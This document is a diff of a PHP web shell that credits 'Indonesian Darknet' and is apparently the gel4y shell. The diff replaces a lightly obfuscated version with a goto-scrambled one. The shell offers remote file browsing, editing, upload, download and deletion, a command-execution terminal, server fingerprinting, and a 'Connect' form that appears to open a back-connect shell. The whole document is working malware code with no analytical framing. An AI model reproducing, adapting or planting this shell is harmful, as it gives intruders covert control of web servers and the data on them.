href=\"?l=" . Scod165Rr2($I_lN09c7SW, 0) . "&a=" . scoD165Rr2("edit", 0) . "&n=" . ScoD165rr2($hFrCwZLJYl, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . SCoD165rR2($I_lN09c7SW, 0) . "&a=" . scod165rr2("rename", 0) . "&n=" . ScOD165RR2($hFrCwZLJYl, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . sCOD165rR2($I_lN09c7SW, 0) . "&n=" . scOD165rr2($hFrCwZLJYl, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . sCOd165rr2($I_lN09c7SW, 0) . "&a=" . ScOd165rR2("delete", 0) . "&n=" . Scod165rR2($hFrCwZLJYl, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>"; goto oSSQtogwMt; z6VE34T7ce: $yARdv6rR_v = filesize("{$I_lN09c7SW}/{$hFrCwZLJYl}") / 1024; goto VLAGD1LAK2; sYjYjilZgD: } goto Z9dkzv793z; LwTnKrb2gA: if (feof($Fpn18PJz_d)) { goto F0xQFfn0VO; } goto jMPcNRaZis; SVaW0fhIwN: fDUZVEdq_w: goto DeFTIAbO1U; Y4EsMEyH4O: rbFg1GuGUf: goto FB75EhKxg7; T1UBhoC41_: goto F5zzwsOrwM; goto pcpGqYKxIS; QSZBpPfN28: goto F5zzwsOrwM; goto bcf0qyytlE; KneIt5lbcF: $RMHbuQpaGc = array_diff(scandir($I_lN09c7SW), ['.', '..']); goto TRpQwGgb1c; mFN0sccJhQ: $fIPtHB3t1c = $RFJjcUG5Gt->open($hNee7BwYVM[$vjeKX6vmt9]); goto VdQSvY5A71; o_dxl30q83: $OiNrDTOvfr = $_FILES['f']['tmp_name']; goto fZPMa7C5AR; gG13wzHgsR: F5zzwsOrwM: goto ysxCc13A4L; hThw1FAitG: echo sCOd165RR2($_GET["n"]); goto Hgp6UtYbMT; LWpw7tFZAk: goto F5zzwsOrwM; goto yf2aassheI; cbhOJULWP6: goto SxcAwFEBKX; goto ur1ttufF6K; KlOPnfptF3: yJvJoa_rQx: goto yzMyxB0XOO; oHjPWHLCJ8: ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+    <?php  goto PpySlVoutO; nsN5CW5xgv: ?>
     <h5>New folder</h5>
     <form method="post">
       <div class="form-group">
@@ -385,64 +77,33 @@ fQt:
         <button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
       </div>
     </form>
-    <?php 
-isset($_POST["s"]) ? file_exists("{$xn5}/{$_POST["n"]}") ? ytX("folder name has been used", 0, "&a=" . U5o("cdir", 0)) : (mkdir("{$xn5}/{$_POST["n"]}") ? Ytx("folder created successfully", 1, U5O("/" . $_POST["n"], 0)) : YTx("folder failed to create", 0)) : null;
-goto vTq;
-U6J:
-?>
-    <pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
-echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . vcI($_POST["cmd"]) : "";
-?></pre>
+    <?php  goto yu0QvRDrXG; Pqd0zB58gx: ?></pre>
     <form method="post">
       <div class="form-group">
         <input type="text" name="cmd" class="form-control">
       </div>
     </form>
-    <?php 
-goto vTq;
-e9j:
-?>
-    <h5>Edit file</h5>
-    <span>File name : <?php 
-echo u5O($_GET["n"]);
-?></span>
-<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
-echo htmlspecialchars(file_get_contents($xn5 . '/' . u5o($_GET["n"])));
-?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-    <?php 
-isset($_POST["s"]) ? file_put_contents($xn5 . '/' . u5O($_GET["n"]), $_POST["ctn"]) ? yTX("file contents changed successfully", 1, "&a=" . U5o("view", 0) . "&n={$_GET["n"]}") : Ytx("file contents failed to change") : null;
-goto vTq;
-o8K:
-?>
-    <h5>View <?php 
-echo $_GET["t"] == "d" ? "folder" : "file";
-?></h5>
-    <form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
-echo u5O($_GET["n"]);
-?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-    <?php 
-isset($_POST["s"]) ? rename($xn5 . '/' . U5O($_GET["n"]), $_POST["n"]) ? ytX("successfully changed the name") : Ytx("failed to change the name", 0) : null;
-goto vTq;
-WMV:
-?>
-    <h5>View file</h5>
-<span>File name : <?php 
-echo U5O($_GET["n"]);
-?></span>
-<div class="form-group"><label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
-echo htmlspecialchars(file_get_contents($xn5 . '/' . U5O($_GET["n"])));
-?></textarea></div>
-    <?php 
-vTq:
-?>
+    <?php  goto AfOhj0UgbP; hGz8UR6V9v: ?></h5>
+    <form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php  goto NrpEZw4RKK; NOPki1VPRd: ?>
+    <div class="px-2 py-2">
+    <?php  goto zEi70zkzTd; uP3nEDF0Tt: if (!($_GET["t"] == "f")) { goto fqbjkF8tFG; } goto X_XgIW8VNc; ySJeKYveVV: wVHimB1XbO("folder deleted successfully", sCOd165rr2($I_lN09c7SW, 0)); goto p9xJ2f65AM; Ck6ClCfjRc: header("Content-Length: " . strtotime(SCoD165Rr2($_GET["n"]))); goto maVTuLjvor; F3VcebjEGw: ?>"><i class="fa fa-terminal"></i></a>
+        </div>
+      </div>
+      <div class="border-top">
+        <ul style="list-style:none;" class="m-0 p-0">
+          <li><b>Server</b>: <?php  goto t4YglQhiE5; GOA9daq_pY: ?></a></h3>
+        </div>
+        <div>
+          <span>PHP Version: <?php  goto ns9M42YdZd; aABsteA3B5: ?>
+    <?php  goto jh7n6eL6pb; qpvqDxlak2: goto DWkF8CvIH0; goto o9PS4uYfjH; yzMyxB0XOO: echo "<font color='red'>{$CwSBQX1tlw} : {$q5jUdzyF0Y}</font>"; goto cbhOJULWP6; NrpEZw4RKK: echo scoD165Rr2($_GET["n"]); goto fZMgVZhTUw; JIkdCXtH17: goto F5zzwsOrwM; goto Py0dYxgwSI; stOOeE0nH7: KdWNo7AjqV: goto CjHzdcIpw4; juZgOCu0BF: wvHimB1XBO("file to delete the folder", scod165rr2($I_lN09c7SW, 0), 0); goto tf_GYYPDNs; ejtmqujYNb: if (move_uploaded_file($OiNrDTOvfr[$vjeKX6vmt9], $hNee7BwYVM[$vjeKX6vmt9])) { goto c8u9XhYh_Q; } goto OeI0AYCWg5; E26lalF_uA: @fwrite($Fpn18PJz_d, $h4rnlsdP_W); goto lHTV2LHwsZ; eqMjYxDM2L: WVhImb1xBO("failed to delete the folder", SCOd165Rr2($I_lN09c7SW, 0), 0); goto lebg1dTG9A; io3g_1iEKc: ?>
     </div>
-    <?php 
-i2O:
-?>
-    <?php 
-goto KWN;
-lAe:
-?>
+    <div class="border bg-dark my-2 py-2 table-responsive">
+      <div class="mx-2">
+        <span>Path:</span>
+        <?php  goto rOBq0oetEF; V3sYxh3Ino: if (!($_GET["t"] == "d")) { goto H5yuZJRAjS; } goto UE8pM5OTuV; PpySlVoutO: isset($_POST["s"]) ? file_put_contents($I_lN09c7SW . '/' . ScOD165Rr2($_GET["n"]), $_POST["ctn"]) ? wvhImb1XBo("file contents changed successfully", ScOD165rr2($I_lN09c7SW, 0) . "&a=" . sCOd165RR2("view", 0) . "&n={$_GET["n"]}") : wvHIMB1xbO("file contents failed to change", ScoD165rr2($I_lN09c7SW, 0), 0) : null; goto vtO6Mte_uT; l3ix3EWzDy: echo php_uname(); goto jftsKZuteU; ArTvBhfEnl: ?>
+    <h5>New file</h5>
+    <form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+    <?php  goto qTOgQRiQRf; DeFTIAbO1U: ?>
     <table class="table table-hover table-borderless table-sm">
       <thead class="text-light">
         <tr>
@@ -453,37 +114,17 @@ lAe:
         </tr>
       </thead>
       <tbody>
-        <?php 
-$aFR = array_diff(scandir($xn5), ['.', '..']);
-foreach ($aFR as $YkI) {
-    if (is_dir("{$xn5}/{$YkI}")) {
-        goto FZy;
-    }
-    goto nwy;
-    FZy:
-    echo "<tr>\n          <td><a href=\"?l=" . U5O("{$xn5}/{$YkI}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$xn5}/{$YkI}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$xn5}/{$YkI}")) == 0 ? "" : "-open") . " text-warning\"></i> {$YkI}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$xn5}/{$YkI}") ? "#00ff00" : (!is_readable("{$xn5}/{$YkI}") ? "red" : null)) . "\">" . M9Q("{$xn5}/{$YkI}") . "</font></td>\n          <td>\n            <a href=\"?l=" . u5O($xn5, 0) . "&a=" . U5O("rename", 0) . "&n=" . U5O($YkI, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . U5o($xn5, 0) . "&a=" . u5o("delete", 0) . "&n=" . U5o($YkI, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>";
-    nwy:
-}
-u2B:
-foreach ($aFR as $SS_) {
-    if (is_file("{$xn5}/{$SS_}")) {
-        goto mY2;
-    }
-    goto buu;
-    mY2:
-    $u0V = filesize("{$xn5}/{$SS_}") / 1024;
-    $u0V = round($u0V, 3);
-    $u0V = $u0V > 1024 ? round($u0V / 1024, 2) . "MB" : $u0V . "KB";
-    echo "<tr>\n\t        <td><a href=\"?l=" . U5O($xn5, 0) . "&a=" . u5O("view", 0) . "&n=" . u5o($SS_, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$xn5}/{$SS_}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$xn5}/{$SS_}" ? " text-danger" : "") . "\"></i> {$SS_}</a></td>\n\t        <td>{$u0V}</td>\n\t        <td><font color=\"" . (is_writable("{$xn5}/{$SS_}") ? "#00ff00" : (!is_readable("{$xn5}/{$SS_}") ? "red" : null)) . "\">" . M9Q("{$xn5}/{$SS_}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a href=\"?l=" . u5O($xn5, 0) . "&a=" . U5O("edit", 0) . "&n=" . u5o($SS_, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . u5O($xn5, 0) . "&a=" . u5o("rename", 0) . "&n=" . u5o($SS_, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . U5O($xn5, 0) . "&n=" . U5O($SS_, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . u5o($xn5, 0) . "&a=" . U5o("delete", 0) . "&n=" . U5o($SS_, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>";
-    buu:
-}
-bBA:
-?>
-      </tbody>
-    </table>
-    <?php 
-KWN:
-?>
+        <?php  goto KneIt5lbcF; VdQSvY5A71: if (!($fIPtHB3t1c == true)) { goto X1wrvj1lS4; } goto ZoGfj_hn2i; sNH2AjSsc9: N2NcOymve_: goto aABsteA3B5; IXOP4R0rfy: DWkF8CvIH0: goto ueI6__rUxY; QwV5y1setZ: $RFJjcUG5Gt->close(); goto xBEic2r1ZC; X5vp9ETlF5: ZgCoZJOFL9: goto YPRTSligfx; l8CXKFCE3N: if (!($vjeKX6vmt9 < count($hNee7BwYVM))) { goto Z1BIxeEn0_; } goto o_dxl30q83; T0ShNahMsS: NpedkrNY5l: goto v0RE2SAi9i; XRfaw0lEpa: Z1BIxeEn0_: goto vdGkISEprn; ZDyElMZQmF: $vjeKX6vmt9++; goto BrCC99QmZj; bcf0qyytlE: fGH6sGAAdw: goto nsN5CW5xgv; Py0dYxgwSI: X94ON33i95: goto sGExma8iO7; a4ylo9zyoS: $s1OVK9lbWK = WHaGu3ZQSi('uname -a'); goto lYWHG190jR; jh7n6eL6pb: goto P3Hi2iwd1U; goto SVaW0fhIwN; l0VEWWoryp: chdir($I_lN09c7SW); goto nx4H_osQzp; hMS8V72NkH: echo '<div class="my-3">'; goto m01do8WUWb; sGExma8iO7: ?>
+    <h5>View file</h5>
+<span>File name : <?php  goto imEup2KTzo; q7NlNU9F79: echo "?l=" . SCoD165rR2($I_lN09c7SW, 0) . "&a=" . SCoD165rr2("cdir", 0); goto FMHj1HdkPm; qPfS3LOdmn: D5xQkaqN6L: goto oQBmms1zYb; yf2aassheI: XToGaMZfBf: goto mox6qQiktB; Yy5ei4krjv: echo "?l=" . scOD165rR2($I_lN09c7SW, 0) . "&a=" . Scod165rr2("term", 0); goto F3VcebjEGw; vdGkISEprn: oH2FX19oex: goto FK22nGHGLF; TRpQwGgb1c: foreach ($RMHbuQpaGc as $UA2QAI9Aou) { goto L0ayjvSovq; ERdGOXGkAf: LaY6MXRjkT: goto HieoR4KTFa; abdnXLW_KC: goto LaY6MXRjkT; goto jyd23QrDlk; L0ayjvSovq: if (is_dir("{$I_lN09c7SW}/{$UA2QAI9Aou}")) { goto rrIlsajR1W; } goto abdnXLW_KC; ifRBwVPhw1: echo "<tr>\n          <td><a href=\"?l=" . SCoD165rR2("{$I_lN09c7SW}/{$UA2QAI9Aou}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$I_lN09c7SW}/{$UA2QAI9Aou}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$I_lN09c7SW}/{$UA2QAI9Aou}")) == 0 ? "" : "-open") . " text-warning\"></i> {$UA2QAI9Aou}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$I_lN09c7SW}/{$UA2QAI9Aou}") ? "#00ff00" : (!is_readable("{$I_lN09c7SW}/{$UA2QAI9Aou}") ? "red" : null)) . "\">" . u9TucK4I9z("{$I_lN09c7SW}/{$UA2QAI9Aou}") . "</font></td>\n          <td>\n            <a href=\"?l=" . sCod165rr2($I_lN09c7SW, 0) . "&a=" . SCod165Rr2("rename", 0) . "&n=" . SCoD165Rr2($UA2QAI9Aou, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . scoD165Rr2($I_lN09c7SW, 0) . "&a=" . SCOd165RR2("delete", 0) . "&n=" . ScOD165rr2($UA2QAI9Aou, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>"; goto ERdGOXGkAf; jyd23QrDlk: rrIlsajR1W: goto ifRBwVPhw1; HieoR4KTFa: } goto Y4EsMEyH4O; LuWToMYtnr: echo "?l=" . sCOd165RR2($I_lN09c7SW, 0) . "&a=" . SCOd165RR2("cfile", 0); goto VjwIX64Qky; m8SfLGjd02: KQLt0D0U6k: goto l8CXKFCE3N; GR4PSTwJoi: header("Content-Transfer-Encoding: Binary"); goto Ck6ClCfjRc; hRufaLMoAj: $jQm7oyW4Qu = $I_lN09c7SW . '/' . ScOd165rr2($_GET["n"]); goto V3sYxh3Ino; Ym92vxFdSr: ?></span><br>
+          <a href="<?php  goto q7NlNU9F79; tB9vZK2Qir: $inT77z9QL1 = '<p>Unexpected error has occured, connection may have failed.</p>'; goto kfkPETDaAp; H4JBzu3vyj: echo $_GET["t"] == "d" ? "folder" : "file"; goto hGz8UR6V9v; ocXYZDbAyt: goto Dz60W6jbh8; goto qPfS3LOdmn; tU5C63PXNZ: function xbsgNP_QMX($HF0evh8iOX) { goto kZ6qbKTOZ5; kZ6qbKTOZ5: global $tJbmOZcmje; goto ftjNicQIjz; lPHNcxbDBh: array_map("deldir", glob($HF0evh8iOX . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); goto rU4A15hHLH; rU4A15hHLH: rmdir($HF0evh8iOX); goto iK56GFa3qQ; gotERXWQII: unlink($HF0evh8iOX); goto TRsGLJfDzE; GBaFc0yEFP: N9mP70HlHk: goto lPHNcxbDBh; seylOLweF5: return; goto bI7yq28KhO; bI7yq28KhO: M50KzLXPQc: goto jRpNRnRWbs; ftjNicQIjz: if (!(trim(pathinfo($HF0evh8iOX, PATHINFO_BASENAME), '.') === '')) { goto M50KzLXPQc; } goto seylOLweF5; iK56GFa3qQ: L2FMvOhNzO: goto BUZZp0TrYF; TRsGLJfDzE: goto L2FMvOhNzO; goto GBaFc0yEFP; jRpNRnRWbs: if (is_dir($HF0evh8iOX)) { goto N9mP70HlHk; } goto gotERXWQII; BUZZp0TrYF: } goto OWUVT5Hc5g; XDOSwg8E31: function u9tUCK4i9z($hFrCwZLJYl) { goto GfYAi9YNmw; DG2loZcIWT: $wrNsc8er0i .= $QZSHwhng7j & 0x4 ? 'r' : '-'; goto Kqq0A_wMV6; GfYAi9YNmw: $QZSHwhng7j = fileperms($hFrCwZLJYl); goto xgFDlpTnQ1; jivVJwLLs_: $wrNsc8er0i .= $QZSHwhng7j & 0x40 ? $QZSHwhng7j & 0x800 ? 's' : 'x' : ($QZSHwhng7j & 0x800 ? 'S' : '-'); goto R0SA0EiELb; S3TdyC_2GB: return $wrNsc8er0i; goto klvZO9R17b; Kqq0A_wMV6: $wrNsc8er0i .= $QZSHwhng7j & 0x2 ? 'w' : '-'; goto BAGMOedk1X; WZ1QGc4In8: ZeBKvbOjfC: goto HF31vbbcb5; eN1SwHWluT: $wrNsc8er0i .= $QZSHwhng7j & 0x10 ? 'w' : '-'; goto tpW5TkUBMh; SbU1fRcbbF: $wrNsc8er0i .= $QZSHwhng7j & 0x80 ? 'w' : '-'; goto jivVJwLLs_; R0SA0EiELb: $wrNsc8er0i .= $QZSHwhng7j & 0x20 ? 'r' : '-'; goto eN1SwHWluT; tpW5TkUBMh: $wrNsc8er0i .= $QZSHwhng7j & 0x8 ? $QZSHwhng7j & 0x400 ? 's' : 'x' : ($QZSHwhng7j & 0x400 ? 'S' : '-'); goto DG2loZcIWT; xgFDlpTnQ1: switch ($QZSHwhng7j & 0xf000) { case 0xc000: $wrNsc8er0i = 's'; goto ZeBKvbOjfC; case 0xa000: $wrNsc8er0i = 'l'; goto ZeBKvbOjfC; case 0x8000: $wrNsc8er0i = '-'; goto ZeBKvbOjfC; case 0x6000: $wrNsc8er0i = 'b'; goto ZeBKvbOjfC; case 0x4000: $wrNsc8er0i = 'd'; goto ZeBKvbOjfC; case 0x2000: $wrNsc8er0i = 'c'; goto ZeBKvbOjfC; case 0x1000: $wrNsc8er0i = 'p'; goto ZeBKvbOjfC; default: $wrNsc8er0i = 'u'; } goto PyvgJMDIGx; PyvgJMDIGx: nvhdxhLUN_: goto WZ1QGc4In8; BAGMOedk1X: $wrNsc8er0i .= $QZSHwhng7j & 0x1 ? $QZSHwhng7j & 0x200 ? 't' : 'x' : ($QZSHwhng7j & 0x200 ? 'T' : '-'); goto S3TdyC_2GB; HF31vbbcb5: $wrNsc8er0i .= $QZSHwhng7j & 0x100 ? 'r' : '-'; goto SbU1fRcbbF; klvZO9R17b: } goto tU5C63PXNZ; p9xJ2f65AM: ORqp0RHsir: goto d56bXPkOvG; jMPcNRaZis: $h4rnlsdP_W = '[gel4y]#:> '; goto E26lalF_uA; r1bYIhfphm: TGbvyJ958C: goto ArTvBhfEnl; xRWajGhsvU: qxwiPIxTUE: goto io3g_1iEKc; LEdsfT_f5L: ?>" class="form-control">
+</div>
+      <div class="form-group">
+        <button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
+      </div>
+      </form>
+    <?php  goto nUrvo842ue; fZMgVZhTUw: ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+    <?php  goto cPKCcf7MR9; imEup2KTzo: echo scOD165rR2($_GET["n"]); goto L8TjZe_v0G; ns9M42YdZd: echo phpversion(); goto Ym92vxFdSr; bJHEdblZKU: F0xQFfn0VO: goto MVg1PkuxCs; ZhKBv1Iz3W: if (!isset($_GET["a"])) { goto fDUZVEdq_w; } goto Hxxc32aPGE; nUrvo842ue: if (!isset($_POST['s'])) { goto ZgCoZJOFL9; } goto hMS8V72NkH; DkoO5aHwEx: fqbjkF8tFG: goto stOOeE0nH7; maVTuLjvor: header("Content-disposition: attachment; filename=\"" . SCod165rR2($_GET["n"]) . "\""); goto xRWajGhsvU; MMQV_0sye0: ?>
     </article>
     <div class="bg-dark border text-center mt-2 py-2"><small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small></div>
   </main>
